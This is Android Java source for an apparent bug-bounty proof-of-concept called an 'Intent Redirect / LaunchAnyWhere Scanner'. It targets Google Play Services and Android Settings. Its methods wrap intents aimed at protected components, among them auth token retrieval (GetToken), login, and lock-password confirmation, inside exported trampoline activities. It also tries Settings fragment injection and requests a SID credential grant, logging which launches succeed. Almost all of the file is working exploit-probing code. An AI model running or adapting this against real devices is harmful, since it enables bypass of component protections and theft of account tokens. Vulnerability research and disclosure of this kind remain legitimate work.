package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class IntentRedirectScanActivity extends Activity {
    private static final String TAG = "IntentRedirect";
    private TextView logView;
    private int requestCodeCounter = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("Intent Redirect / LaunchAnyWhere Scanner\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        log("[RESULT] reqCode=" + requestCode + " resultCode=" + resultCode);
        if (data != null) {
            log("  data=" + data.toUri(0));
            if (data.getExtras() != null) {
                for (String key : data.getExtras().keySet()) {
                    Object val = data.getExtras().get(key);
                    log("  extra[" + key + "]=" + (val != null ? val.getClass().getSimpleName() + ":" + shorten(val.toString(), 80) : "null"));
                }
            }
        }
    }

    private void runTests() {
        testTrampolineRedirect();
        testCredentialExport();
        testIntentFulfillment();
        testGmsCommonRedirectPatterns();
        testSettingsRedirect();
        testAccountManagerRedirect();
        log("\n=== ALL INTENT REDIRECT TESTS COMPLETE ===");
    }

    private void testTrampolineRedirect() {
        log("=== TransparentTrampolineActivity (Nearby Sharing) ===\n");

        // Create a nested intent targeting a non-exported GMS activity
        Intent innerIntent = new Intent();
        innerIntent.setComponent(new ComponentName("com.google.android.gms",
            "com.google.android.gms.auth.account.be.legacy.GoogleAccountDataService"));
        innerIntent.setAction("android.intent.action.MAIN");

        String[] extraKeys = {"intent", "android.intent.extra.INTENT", "redirect_intent",
            "next_intent", "target_intent", "pending_intent", "inner_intent",
            "com.google.android.gms.nearby.EXTRA_INTENT"};

        for (String key : extraKeys) {
            try {
                Intent outer = new Intent("com.google.android.gms.SHARE_NEARBY");
                outer.setComponent(new ComponentName("com.google.android.gms",
                    "com.google.android.gms.nearby.sharing.migration.TransparentTrampolineActivity"));
                outer.putExtra(key, innerIntent);
                outer.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(outer, requestCodeCounter++);
                log("[TRAMPOLINE-" + key + "] Launched OK");
                Thread.sleep(500);
            } catch (Exception e) {
                log("[TRAMPOLINE-" + key + "] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
            }
        }
    }

    private void testCredentialExport() {
        log("\n=== ExportCredentialsActivity (Credential Manager) ===\n");

        // Test 1: Direct launch
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.credential.manager.credentialexchange.ExportCredentialsActivity"));
            startActivityForResult(intent, requestCodeCounter++);
            log("[CRED-EXPORT-1] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[CRED-EXPORT-1] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }

        // Test 2: With intent action
        try {
            Intent intent = new Intent("android.settings.CREDENTIAL_PROVIDER");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.credential.manager.credentialexchange.ExportCredentialsActivity"));
            startActivityForResult(intent, requestCodeCounter++);
            log("[CRED-EXPORT-2] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[CRED-EXPORT-2] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }
    }

    private void testIntentFulfillment() {
        log("\n=== IntentFulfillmentActivity (GestureExchange) ===\n");

        // This activity handles SEND intents — test if it redirects
        Intent innerIntent = new Intent();
        innerIntent.setComponent(new ComponentName("com.google.android.gms",
            "com.google.android.gms.auth.GetToken"));

        String[] extraKeys = {"intent", "android.intent.extra.INTENT", "fulfillment_intent"};
        for (String key : extraKeys) {
            try {
                Intent outer = new Intent(Intent.ACTION_SEND);
                outer.setComponent(new ComponentName("com.google.android.gms",
                    "com.google.android.gms.gestureexchange.ui.IntentFulfillmentActivity"));
                outer.putExtra(key, innerIntent);
                outer.setType("text/plain");
                outer.putExtra(Intent.EXTRA_TEXT, "test");
                startActivityForResult(outer, requestCodeCounter++);
                log("[FULFILLMENT-" + key + "] Launched OK");
                Thread.sleep(500);
            } catch (Exception e) {
                log("[FULFILLMENT-" + key + "] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
            }
        }
    }

    private void testGmsCommonRedirectPatterns() {
        log("\n=== GMS Common Intent Redirect Patterns ===\n");

        // Target non-exported activity to detect redirect
        Intent innerIntent = new Intent();
        innerIntent.setComponent(new ComponentName("com.google.android.gms",
            "com.google.android.gms.auth.login.LoginActivity"));

        // Test various GMS activities known to handle resolution intents
        String[][] activities = {
            {"com.google.android.gms", ".common.api.GoogleApiActivity", "GoogleApiActivity"},
            {"com.google.android.gms", ".auth.api.signin.internal.SignInHubActivity", "SignInHub"},
            {"com.google.android.gms", ".auth.api.phone.internal.PhoneNumberHintIntentActivity", "PhoneHint"},
        };

        for (String[] act : activities) {
            String[] keys = {"resolution", "android.intent.extra.INTENT", "intent",
                "com.google.android.gms.common.api.EXTRA_RESOLUTION", "pendingIntent"};
            for (String key : keys) {
                try {
                    Intent outer = new Intent();
                    outer.setComponent(new ComponentName(act[0], act[0] + act[1]));
                    outer.putExtra(key, innerIntent);
                    startActivityForResult(outer, requestCodeCounter++);
                    log("[" + act[2] + "-" + key + "] Launched OK");
                    Thread.sleep(300);
                } catch (Exception e) {
                    log("[" + act[2] + "-" + key + "] " + shorten(e.getMessage(), 50));
                }
            }
        }
    }

    private void testSettingsRedirect() {
        log("\n=== Settings Intent Redirect ===\n");

        // Test SubSettings fragment injection
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.SubSettings"));
            intent.putExtra(":settings:show_fragment",
                "com.android.settings.password.ChooseLockPassword");
            intent.putExtra(":settings:show_fragment_title", "Test");
            startActivityForResult(intent, requestCodeCounter++);
            log("[SUBSETTINGS-FRAGMENT] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[SUBSETTINGS-FRAGMENT] " + shorten(e.getMessage(), 60));
        }

        // Test Settings with intent extra
        try {
            Intent inner = new Intent();
            inner.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.password.ConfirmLockPassword"));
            Intent outer = new Intent(android.provider.Settings.ACTION_SETTINGS);
            outer.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.Settings"));
            outer.putExtra("android.intent.extra.INTENT", inner);
            startActivityForResult(outer, requestCodeCounter++);
            log("[SETTINGS-REDIRECT] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[SETTINGS-REDIRECT] " + shorten(e.getMessage(), 60));
        }
    }

    private void testAccountManagerRedirect() {
        log("\n=== AccountManager Resolution Redirect ===\n");

        // AccountManager returns PendingIntents for auth resolution
        // If we can craft a resolution intent that GMS follows, we get LaunchAnyWhere
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.uiflows.addaccount.AccountIntroActivity"));
            intent.putExtra("authAccount", "test@gmail.com");
            intent.putExtra("accountType", "com.google");
            startActivityForResult(intent, requestCodeCounter++);
            log("[ACCT-INTRO] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[ACCT-INTRO] " + shorten(e.getMessage(), 60));
        }

        // Test ConsentActivity with redirect
        try {
            Intent inner = new Intent();
            inner.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.GetToken"));
            Intent outer = new Intent();
            outer.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.uiflows.minutemaid.MinuteMaidActivity"));
            outer.putExtra("android.intent.extra.INTENT", inner);
            outer.putExtra("intent", inner);
            startActivityForResult(outer, requestCodeCounter++);
            log("[MINUTEMAID-REDIRECT] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[MINUTEMAID-REDIRECT] " + shorten(e.getMessage(), 60));
        }

        // Test GrantCredentialsPermissionActivity
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.GrantCredentialsPermissionActivity"));
            intent.putExtra("authAccount", "sandiyotest@gmail.com");
            intent.putExtra("authTokenType", "SID");
            intent.putExtra("callingUid", android.os.Process.myUid());
            startActivityForResult(intent, requestCodeCounter++);
            log("[GRANT-CRED] Launched OK");
            Thread.sleep(500);
        } catch (Exception e) {
            log("[GRANT-CRED] " + shorten(e.getMessage(), 60));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
